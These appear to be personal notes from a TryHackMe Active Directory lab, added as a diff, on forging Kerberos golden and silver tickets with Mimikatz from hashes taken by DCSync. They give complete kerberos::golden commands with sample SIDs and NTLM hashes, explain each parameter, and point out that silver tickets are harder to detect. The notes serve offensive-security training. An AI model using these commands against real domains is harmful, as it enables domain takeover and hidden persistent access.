@@ -1,0 +1,62 @@
+Forging Tickets for Fun and Profit: (this step is linked with DCSync)
+After get infos from DCSync.
+
+******** GOLDEN TICKET **********
+
+We will need the NTLM hash of the KRBTGT account, which you should now have due to the DC Sync performed in the previous task. 
+Furthermore, make a note of the NTLM hash associated with the THMSERVER1 machine account since we will need this one for our silver ticket. 
+We can find this information in the DC dump that you performed. 
+The last piece of information we need is the Domain SID. 
+Using our low-privileged SSH terminal on THMWRK1, we can use the AD-RSAT cmdlet to recover this information:
+
+    Winodws Victim CMD:
+        powershell
+    WE NEED DOMAIN SID via powershell CMD
+        Get-ADDomain
+
+    USE mimikatz:
+        mimikatz # kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt
+        ex: -> kerberos::golden /admin:vfordAdmin /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt
+
+        Parameters explained:
+
+            /admin - The username we want to impersonate. This does not have to be a valid user.
+            /domain - The FQDN of the domain we want to generate the ticket for.
+            /id -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.
+            /sid -The SID of the domain we want to generate the ticket for.
+            /krbtgt -The NTLM hash of the KRBTGT account.
+            /endin - The ticket lifetime. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 10 hours (600 minutes)
+            /renewmax -The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes)
+            /ptt - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.
+
+    We can verify that the golden ticket is working by running the dir command against the domain controller:
+        Terminal:
+        za\aaron.jones@THMWRK1 C:\Users\Administrator.ZA>dir \\thmdc.za.tryhackme.loc\c$\
+
+
+
+********* SILVER TICKET **********
+Even if the golden ticket has an incredibly long time, the blue team can still defend against this by simply rotating the KRBTGT password twice. 
+If we really want to dig in our roots, we want to generate silver tickets, 
+which are less likely to be discovered and significantly harder to defend against since the passwords of every machine account must be rotated. 
+
+We can use the following Mimikatz command to generate a silver ticket:
+    Mimikatz Terminal:
+        mimikatz # kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt
+            ex: kerberos::golden /admin:vfordAdminBCK /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /target:THMSERVER1.za.tryhackme.loc /rc4:4c02d970f7b3da7f8ab6fa4dc77438f4 /service:cifs /ptt
+    
+    Parameters explained:
+        /admin - The username we want to impersonate. This does not have to be a valid user.
+        /domain - The FQDN of the domain we want to generate the ticket for.
+        /id -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.
+        /sid -The SID of the domain we want to generate the ticket for.
+        /target - The hostname of our target server. Let's do THMSERVER1.za.tryhackme.loc, but it can be any domain-joined host.
+        /rc4 - The NTLM hash of the machine account of our target. Look through your DC Sync results for the NTLM hash of THMSERVER1$. The $ indicates that it is a machine account.
+        /service - The service we are requesting in our TGS. CIFS is a safe bet, since it allows file access.
+        /ptt - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.
+
+We can verify that the silver ticket is working by running the dir command against THMSERVER1:
+    Terminal:
+        dir \\thmserver1.za.tryhackme.loc\c$\
+
+Now we have golden and silver tickets to the AD environment, providing better persistence than just credentials!
